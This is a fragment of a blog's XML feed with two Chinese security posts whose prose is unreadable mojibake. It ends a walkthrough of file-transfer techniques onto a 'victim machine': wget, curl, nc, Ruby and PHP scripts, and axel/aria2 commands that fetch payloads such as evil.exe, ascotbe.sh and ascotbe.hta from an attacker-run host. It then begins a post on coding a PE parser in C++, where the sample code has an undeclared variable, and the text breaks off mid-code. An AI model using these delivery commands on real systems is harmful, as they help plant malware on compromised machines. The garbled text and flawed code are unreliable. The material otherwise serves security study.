href="#Windows-Linuxé€šç”¨" class="headerlink" title="Windows/Linuxé€šç”¨"></a>Windows/Linuxé€šç”¨</h4><h5 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h5><p>wget æ˜¯ä¸€ä¸ªä»ç½‘ç»œä¸Šè‡ªåŠ¨ä¸‹è½½æ–‡ä»¶çš„è‡ªç”±å·¥å…·ï¼Œæ”¯æŒé€šè¿‡ HTTPã€HTTPSã€FTP ä¸‰ä¸ªæœ€å¸¸è§çš„ TCP/IPåè®®ä¸‹è½½ï¼Œå¹¶å¯ä»¥ä½¿ç”¨HTTP ä»£ç†ã€‚â€wgetâ€ è¿™ä¸ªåç§°æ¥æºäº â€œWorld Wide Webâ€ ä¸ â€œgetâ€ çš„ç»“åˆã€‚</p><p>ç›´æ¥ä¸‹è½½æœåŠ¡å™¨ä¸‹çš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.183.138:8000/test.txt</span><br></pre></td></tr></table></figure><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><p>cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œ1997å¹´é¦–æ¬¡å‘è¡Œï¼Œå®ƒæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°cURLä¸ºä¸‹è½½å·¥å…·ï¼ŒcURLè¿˜åŒ…å«äº†ç”¨äºç¨‹åºå¼€å‘çš„libcurlã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.183.138:8000/test.txt -o evil.exe</span><br></pre></td></tr></table></figure><h5 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h5><p>ncæ˜¯ä¸€æ¬¾å®‰å…¨å·¥å…·ï¼Œå®ƒè¿˜æœ‰å…¶ä»–çš„åå­— Netcatï¼Œ Ncat å¯ç”¨æ¥åšç«¯å£æ‰«æï¼Œç«¯å£è½¬å‘ï¼Œè¿æ¥è¿œç¨‹ç³»ç»Ÿç­‰ã€‚</p><p>æœåŠ¡å™¨è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8023 &lt; ascotbe.exe</span><br></pre></td></tr></table></figure><p>å—å®³æœºå™¨ä¸‹è½½è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.138 8023 &gt; ascotbe.exe</span><br></pre></td></tr></table></figure><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p>Pythonæ˜¯ç›®å‰å¾ˆå—æ¬¢è¿çš„ä¸»æµè„šæœ¬è¯­è¨€ï¼Œè¿™ä¸ªçš„è¯ç›´æ¥ç”¨<strong>request</strong>è¯·æ±‚ç„¶åè·å–æ•°æ®ä¿å­˜ä¸º<code>XXX.txt</code>æ–‡ä»¶å³å¯</p><h5 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h5><p>å½“ç›®æ ‡ä¸»æœºå†…å®‰è£…äº†Rubyæ—¶</p><p>æŠŠæ–‡ä»¶ä¿å­˜ä¸º<code>test.rb</code>ï¼Œä½¿ç”¨çš„æ˜¯é»˜è®¤80ç«¯å£</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!ruby</span></span><br><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/http&#x27;</span></span><br><span class="line">Net::HTTP.start(<span class="string">&quot;192.168.183.142&quot;</span>) &#123; <span class="params">|http|</span></span><br><span class="line">r = http.get(<span class="string">&quot;/ascotbe.sh&quot;</span>)</span><br><span class="line">open(<span class="string">&quot;test.sh&quot;</span>, <span class="string">&quot;wb&quot;</span>) &#123; <span class="params">|file|</span></span><br><span class="line">file.write(r.body)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby test.rb</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/19.png" alt="image-20200712135455650"></p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p>å½“ç›®æ ‡ä¸»æœºå†…å®‰è£…äº†PHPæ—¶</p><p>æŠŠä¸‹é¢ä»£ç ä¿å­˜ä¸º<code>test.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$data</span> = @file(<span class="string">&quot;http://192.168.183.142/ascotbe.sh&quot;</span>);</span><br><span class="line">        <span class="variable">$lf</span> = <span class="string">&quot;test.sh&quot;</span>;</span><br><span class="line">        <span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[<span class="number">0</span>]);</span><br><span class="line">        fclose(<span class="variable">$fh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php test.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/20.png" alt="image-20200712135856567"></p><h4 id="ä»…é™windows"><a href="#ä»…é™windows" class="headerlink" title="ä»…é™windows"></a>ä»…é™windows</h4><h5 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad"></a>Notepad</h5><p>å¦‚æœä½ æœ‰æƒé™æ¥å…¥ä¸€å°(è¿œç¨‹è¿æ¥æˆ–è€…ç‰©ç†æœº)ç”µè„‘ï¼Œä½†æ˜¯å½“å‰ç”¨æˆ·æƒé™ä¸å…è®¸æ‰“å¼€æµè§ˆå™¨ï¼Œä½†æ˜¯ç›®æ ‡ä¸»æœºæœ‰å®‰è£…<strong>notepad</strong>é‚£ä¹ˆå¯ä»¥ä¸‹è½½ä¿å­˜è¿è¡Œä¸€éƒ¨åˆ°ä½</p><p>é¦–å…ˆç‚¹å‡»è¿™ä¸ª</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/21.png" alt="image-20200712010411814"></p><p>ç„¶åè¿™ä¸ªä½ç½®è¾“å…¥<strong>WEB</strong>è¿æ¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/22.png" alt="image-20200712010547770"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ª</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/23.png" alt="image-20200712010620333"></p><p>å½“ç„¶windowsè‡ªå¸¦çš„<code>notepad.exe</code>ä¹Ÿæ˜¯ä¸€æ ·å¯ä»¥æ‰“å¼€è¿œç¨‹æ–‡ä»¶çš„ï¼Œç”¨æ³•ä¹Ÿæ˜¯ä¸€æ ·</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/24.png" alt="image-20200712122006652"></p><p>æ‰“å¼€å¦‚ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/25.png" alt="image-20200712122029596"></p><h4 id="ä»…é™Linux"><a href="#ä»…é™Linux" class="headerlink" title="ä»…é™Linux"></a>ä»…é™Linux</h4><h5 id="Axel"><a href="#Axel" class="headerlink" title="Axel"></a>Axel</h5><p>è¿™æ˜¯wgetçš„å‡ºè‰²æ›¿ä»£è€…ï¼Œæ˜¯ä¸€æ¬¾è½»é‡çº§ä¸‹è½½å®ç”¨å·¥å…·ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸ªåŠ é€Ÿå™¨ï¼Œå› ä¸ºå®ƒæ‰“å¼€äº†å¤šè·¯httpè¿æ¥ï¼Œå¯ä¸‹è½½ç‹¬ç«‹æ–‡ä»¶ç‰‡æ®µï¼Œå› è€Œæ–‡ä»¶ä¸‹è½½èµ·æ¥æ›´å¿«é€Ÿã€‚</p><p><strong>å®‰è£…</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install axel </span><br></pre></td></tr></table></figure><p>ä¸‹è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axel http://192.168.1.7:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/26.png" alt="image-20200712125416896"></p><h5 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h5><p>è¿™æ˜¯ä¸€ç§å¼€æºå‘½ä»¤è¡Œä¸‹è½½åŠ é€Ÿå™¨ï¼Œæ”¯æŒå¤šä¸ªç«¯å£ï¼Œä½ å¯ä»¥ä½¿ç”¨æœ€å¤§å¸¦å®½æ¥ä¸‹è½½æ–‡ä»¶ï¼Œæ˜¯ä¸€æ¬¾æ˜“äºå®‰è£…ã€æ˜“äºä½¿ç”¨çš„å·¥å…·ã€‚</p><p>å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install aria2 </span><br></pre></td></tr></table></figure><p>ä¸‹è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c http://192.168.1.7:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/27.png" alt="image-20200712130640141"></p><p>å‚è€ƒæ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;linux.cn&#x2F;article-7369-1.html</span><br><span class="line">https:&#x2F;&#x2F;blog.netspi.com&#x2F;15-ways-to-download-a-file&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7937</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ¶æ„ç¨‹åºç ”ç©¶ä¹‹PEè§£æå™¨</title>
    <link href="https://www.ascotbe.com/2020/07/05/PortableExecutableParser/"/>
    <id>https://www.ascotbe.com/2020/07/05/PortableExecutableParser/</id>
    <published>2020-07-05T12:45:53.000Z</published>
    <updated>2021-07-05T01:52:22.792Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¹‹å‰ä¸ºäº†å­¦ä¹ PEç»“æ„çŸ¥è¯†æ¶è¡¥äº†ä¸€ä¸‹ç›¸å…³æ–‡ç« ï¼Œç„¶åä½¿ç”¨<code>010 Editor</code>è¿™ä¸ªè½¯ä»¶ä¹Ÿå¯ä»¥å®Œæ•´çš„è¯»å–å‡ºPEçš„ç»“æ„å’Œå­—æ®µï¼Œä½†æ˜¯è¿™éƒ½æ˜¯åˆ«äººå†™å¥½çš„ï¼Œè‡ªå·±æ²¡æœ‰ç©è¿‡ä¸€éçš„ä¸œè¥¿éƒ½ä¸å«å­¦è¿‡ï¼Œé‚£åªèƒ½å«è§è¿‡æ‰€ä»¥å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼Œå„ä½çœ‹å®˜åˆ«æ€¥éœ€è¦å‡ å¤©æ—¶é—´æ‰èƒ½æå®šï¼Œæ¯•ç«Ÿè¿˜ä¸ç†Ÿæ‚‰å¦‚æœæœ‰å“ªé‡Œå†™é”™äº†ï¼Œå¿˜å„ä½æ–§æ­£ï¼ï¼ˆPSï¼šå½“å‰ä»£ç è¾“å‡ºä¸å¤Ÿç¾è§‚åæœŸä¼šä¿®æ”¹ï¼‰</p><h4 id="ä½¿ç”¨ç¯å¢ƒ"><a href="#ä½¿ç”¨ç¯å¢ƒ" class="headerlink" title="ä½¿ç”¨ç¯å¢ƒ"></a>ä½¿ç”¨ç¯å¢ƒ</h4><ul><li>Visual Studio 2019 ï¼ˆå®‡å®™æœ€å¼ºç¼–è¯‘å™¨</li><li>windows 10</li></ul><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><p><a href="https://www.ascotbe.com/2020/03/23/PEStructureCombing/">æ¶æ„ç¨‹åºç ”ç©¶ä¹‹PEç»“æ„æ¢³ç†</a></p><h4 id="è·å–æ–‡ä»¶æ˜ è±¡"><a href="#è·å–æ–‡ä»¶æ˜ è±¡" class="headerlink" title="è·å–æ–‡ä»¶æ˜ è±¡"></a>è·å–æ–‡ä»¶æ˜ è±¡</h4><p>é¦–å…ˆä»‹ç»ä¸‹å†…å­˜æ˜ å°„æ–‡ä»¶æŠ€æœ¯ä½œç”¨</p><ul><li>ä½¿ç”¨å†…å­˜æ˜ å°„æ–‡ä»¶æ¥è®¿é—®ç£ç›˜ä¸Šçš„æ•°æ®æ–‡ä»¶ã€‚è¿™ä½¿ä½ å¯ä»¥ä¸å¿…å¯¹æ–‡ä»¶æ‰§è¡Œ<strong>I/O</strong>æ“ä½œï¼Œå¹¶ä¸”å¯ä»¥ä¸å¿…å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œç¼“å­˜.</li><li>å¯ä»¥ä½¿ç”¨å†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œä½¿åŒä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œçš„å¤šä¸ªè¿›ç¨‹èƒ½å¤Ÿç›¸äº’ä¹‹é—´å…±äº«æ•°æ®ã€‚windowsç¡®å®æä¾›äº†å…¶ä»–ä¸€äº›æ–¹æ³•ï¼Œä»¥ä¾¿åœ¨è¿›ç¨‹ä¹‹é—´è¿›è¡Œæ•°æ®é€šä¿¡ï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•éƒ½æ˜¯ä½¿ç”¨å†…å­˜æ˜ å°„æ–‡ä»¶æ¥å®ç°çš„ï¼Œè¯¸å¦‚ä½¿ç”¨<strong>SendMessage</strong>æˆ–è€…<strong>PostMessage</strong>ï¼Œéƒ½åœ¨å†…éƒ¨ä½¿ç”¨äº†å†…å­˜æ˜ å°„æ–‡ä»¶.è¿™ä½¿å¾—å†…å­˜æ˜ å°„æ–‡ä»¶æˆä¸ºå•ä¸ªè®¡ç®—æœºä¸Šçš„å¤šä¸ªè¿›ç¨‹äº’ç›¸è¿›è¡Œé€šä¿¡çš„æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚</li></ul><p>å…¶å®æˆ‘ä»¬éœ€è¦è·å–æ–‡ä»¶çš„å†…å­˜æ˜ å°„çš„è¯éœ€è¦å®Œæˆä¸‰æ­¥</p><ul><li>è·å–è¿™ä¸ªæ–‡ä»¶çš„å¥æŸ„ï¼ˆCreateFileï¼‰</li><li>è·å–æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ï¼ˆCreateFileMappingï¼‰</li><li>åœ¨è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´æ˜ å°„ä¸€ä¸ªæ–‡ä»¶è§†å›¾ï¼ˆMapViewOfFileï¼‰</li></ul><p>å…·ä½“çš„ä»£ç å¦‚ä¸‹ï¼Œè¿”å›ä¸€ä¸ªæ˜ å°„è§†å›¾çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªåœ°å€ä¼šè´¯ç©¿å…¨æ–‡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenPeByFileName</span><span class="params">(LPTSTR FileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPTSTR PortableExecutableFileName = FileName;<span class="comment">//è·å–PEæ–‡ä»¶åå­—</span></span><br><span class="line">    HANDLE hFile, hMapFile, hMapAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFile(PortableExecutableFileName, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);<span class="comment">//è·å–ç¨‹åºå¥æŸ„</span></span><br><span class="line">    dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;æ–‡ä»¶å¤§å°ï¼š                                       &quot;</span> &lt;&lt; dwFileSize&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    hMapFile = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, dwFileSize, <span class="literal">NULL</span>);<span class="comment">//åˆ›å»ºæ–‡ä»¶æ˜ è±¡</span></span><br><span class="line">    hMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, dwFileSize);<span class="comment">//åœ¨è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´æ˜ å°„ä¸€ä¸ªæ–‡ä»¶è§†å›¾ï¼Œè¿”å›ä¸€ä¸ªæ˜ å°„è§†å›¾çš„èµ·å§‹åœ°å€</span></span><br><span class="line">                                                                           <span class="comment">//æŠŠBè¿›ç¨‹çš„æ–‡ä»¶æ˜ è±¡å­˜æ”¾åˆ°Aä¸­ï¼Œè¿™æ ·å¥½é€šä¿¡</span></span><br><span class="line">    <span class="keyword">if</span> (hMapAddress != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> hMapAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hMapAddress = <span class="literal">NULL</span>;</span><br><span class="line">    lpMapAddress = OpenPeByFileName(<span class="string">L&quot;D:\\BitComet\\BitComet.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–PEæŒ‡çº¹ï¼ˆDOSå¤´ï¼‰"><a href="#è·å–PEæŒ‡çº¹ï¼ˆDOSå¤´ï¼‰" class="headerlink" title="è·å–PEæŒ‡çº¹ï¼ˆDOSå¤´ï¼‰"></a>è·å–PEæŒ‡çº¹ï¼ˆDOSå¤´ï¼‰</h4><p>é€šè¿‡æŠŠæ–‡ä»¶æ˜ è±¡è½¬æ¢æˆ<strong>PIMAGE_DOS_HEADER</strong>è¡¨ï¼Œç„¶åè¯»å–å°±å¯ä»¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayDOSHeadInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DOSç­¾å(MZSignature)ï¼š                           %x\n&quot;</span>, pDosHead-&gt;e_magic);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶æœ€åé¡µçš„å­—èŠ‚æ•°(UsedBytesInTheLastPage)ï¼š     %x\n&quot;</span>, pDosHead-&gt;e_cblp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶é¡µæ•°(FileSizeInPages)ï¼š                      %x\n&quot;</span>, pDosHead-&gt;e_cp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é‡å®šä¹‰å…ƒç´ ä¸ªæ•°(NumberOfRelocationItems)ï¼š        %x\n&quot;</span>, pDosHead-&gt;e_crlc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¤´éƒ¨å°ºå¯¸(HeaderSizeInParagraphs)ï¼š               %x\n&quot;</span>, pDosHead-&gt;e_cparhdr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ‰€éœ€çš„æœ€å°é™„åŠ æ®µ(MinimumExtraParagraphs)ï¼š       %x\n&quot;</span>, pDosHead-&gt;e_minalloc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ‰€éœ€çš„æœ€å¤§é™„åŠ æ®µ(MaximumExtraParagraphs)ï¼š       %x\n&quot;</span>, pDosHead-&gt;e_maxalloc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹çš„SSå€¼(InitialRelativeSS)ï¼š                  %x\n&quot;</span>, pDosHead-&gt;e_ss);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹çš„SPå€¼(InitialSP)ï¼š                          %x\n&quot;</span>, pDosHead-&gt;e_sp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ ¡éªŒå’Œ(Checksum)ï¼š                               %x\n&quot;</span>, pDosHead-&gt;e_csum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹çš„IPå€¼(InitialIP)ï¼š                          %x\n&quot;</span>, pDosHead-&gt;e_ip);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åˆå§‹çš„CSå€¼(InitialRelativeCS)ï¼š                  %x\n&quot;</span>, pDosHead-&gt;e_cs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;é‡åˆ†é…è¡¨æ–‡ä»¶åœ°å€(AddressOfRelocationTable)ï¼š     %x\n&quot;</span>, pDosHead-&gt;e_lfarlc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¦†ç›–å·(OverlayNumber)ï¼š                          %x\n&quot;</span>, pDosHead-&gt;e_ovno);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¿ç•™å­—[4](Reserved)ï¼š\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[0]ï¼š                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[1]ï¼š                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[2]ï¼š                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[3]ï¼š                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OEMæ ‡è¯†ç¬¦(OEMid)ï¼š                               %x\n&quot;</span>, pDosHead-&gt;e_oemid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OEMä¿¡æ¯(OEMinfo)ï¼š                               %x\n&quot;</span>, pDosHead-&gt;e_oeminfo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä¿ç•™å­—[10](Reserved2)ï¼š\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[0]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[1]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[2]ï¼š                                     %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[3]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[4]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[5]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[6]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[7]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[8]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[9]ï¼š                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">9</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æŒ‡ç¤ºNTå¤´çš„åç§»(AddressOfNewExeHeader)ï¼š          %x\n&quot;</span>, pDosHead-&gt;e_lfanew);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ä½¿ç”¨<code>010 Editor</code>å’Œ<code>VS 2019</code>ä¸­è¯»å–çš„å†…å®¹ä¸€è‡´</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/20.png" alt="image-20200705192958733"></p><p>è¾“å‡ºå†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/PE/21.png" alt="image-20200705193058120"></p><h4 id="è·å–NTå¤´"><a href="#è·å–NTå¤´" class="headerlink" title="è·å–NTå¤´"></a>è·å–NTå¤´</h4><p>è·å–NTè¡¨çš„å¥æŸ„ï¼Œå› ä¸ºåé¢éƒ½éœ€è¦ç”¨åˆ°ï¼Œæ‰€ä»¥è¿™è¾¹ç›´æ¥å°è£…æˆå‡½æ•°å°±å¥½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PIMAGE_NT_HEADERS <span class="title">GetNtHead</span><span class="params">(HANDLE 